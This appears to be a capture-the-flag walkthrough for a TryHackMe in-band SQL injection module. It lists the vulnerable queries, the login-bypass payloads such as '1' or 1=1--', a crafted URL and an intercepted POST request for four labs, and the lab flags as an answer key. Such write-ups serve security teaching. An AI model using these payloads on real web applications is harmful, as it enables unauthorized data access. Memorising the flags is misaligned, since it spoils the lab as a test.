# Technical Documentation: TryHackMe — SQL Injection Lab Walkthrough
Executive Summary
This document details the exploitation methodologies, parameters, and flags retrieved during the completion of Module 1: In-Band (Classic) SQL Injection on TryHackMe.

Exploitation Breakdown
Lab 1: Input Box Non-String (```/sesqli1/home```)
- Vulnerability Analysis: The application accepts integer input for the ```profileID``` parameter without sanitization or string wrapping inside the SQL query.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID=1 or 1=1--
```
(Captured from)
- Exploit Payload: ```1 or 1=1--```
- Retrieved Flag: ```THM{dccea429d73d4a6b4f117ac64724f460}```

Lab 2: Input Box String (```/sesqli2/login```)
- Vulnerability Analysis: User input is embedded within single quotes inside the SQL query. Injecting a single quote breaks the string context, enabling boolean manipulation and query truncation via comments.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1' or 1=1--' AND password='a'
```
(Captured from)
- Exploit Payload: ```1' or 1=1--```
- Retrieved Flag: ```THM{356e9de6016b9ac34e02df99a5f755ba}```

Lab 3: URL Injection (```/sesqli3/login```)
- Vulnerability Analysis: Parameters supplied directly via URL query strings are concatenated into the SQL statement without proper escaping or prepared statements.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID='1' or 1=1--' AND password='a'
```
(Captured from)
- Exploit Payload (URL):
```plaintext
http://10.48.174.24:5000/sesqli3/login?profileID=1' or 1=1--&password=a
```
(Captured from)
- Retrieved Flag: ```THM{645eab5d34f81981f5705de54e8a9c36}```

Lab 4: POST Request Body Injection (```/sesqli4/login```)
- Vulnerability Analysis: Parameters transmitted in the HTTP POST body (```application/x-www-form-urlencoded```) are vulnerable to injection. Intercepting and modifying the POST body bypasses client-side controls.
- Executed Query:
```sql
SELECT uid, name, profileID, salary, passportNr, email, nickName, password FROM usertable WHERE profileID = '1'or 1=1--' AND password='a'
```
(Captured from)
- Intercepted HTTP POST Body:
```HTTP
POST /sesqli4/login HTTP/1.1
Host: 10.48.174.24:5000
Content-Type: application/x-www-form-urlencoded

profileID=1'or 1=1--&password=a
```
(Captured from)
- Retrieved Flag: ```THM{727334fd0f0ea1b836a8d443f09dc8eb}```

Summary Table: Module 1 Answers
| Challenge Name                         | Injection Point,Payload           | Flag                                   |
|:--                                     |:--                                |:--                                     |
| SQL Injection 1: Input Box Non-String  | Form Input (Integer),1 or 1=1--   | THM{dccea429d73d4a6b4f117ac64724f460}  |
| SQL Injection 2: Input Box String      | Form Input (String),1' or 1=1--   | THM{356e9de6016b9ac34e02df99a5f755ba}  | 
| SQL Injection 3: URL Injection         | URL GET Parameter,1' or 1=1--     | THM{645eab5d34f81981f5705de54e8a9c36}  |

| SQL Injection 4: POST Injection        | HTTP POST Body,1'or 1=1--         | THM{727334fd0f0ea1b836a8d443f09dc8eb}  | 
